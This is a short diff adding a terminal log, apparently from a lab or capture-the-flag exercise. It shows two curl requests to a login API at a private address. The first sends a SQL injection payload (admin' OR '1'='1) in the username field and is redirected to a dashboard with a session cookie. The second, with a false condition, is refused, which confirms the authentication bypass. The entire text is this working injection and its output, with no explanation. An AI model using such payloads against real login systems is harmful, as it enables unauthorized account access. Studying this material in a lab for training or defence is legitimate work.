@@ -1,0 +1,10 @@
+$ curl -i -s -d "username=admin' OR '1'='1&password=x" http://10.10.10.10/api/login
+HTTP/1.1 302 Found
+Location: /dashboard
+Set-Cookie: session=lab_only_session_value; HttpOnly
+
+$ curl -i -s -d "username=admin' OR '1'='2&password=x" http://10.10.10.10/api/login
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"success":false,"error":"Invalid username or password"}
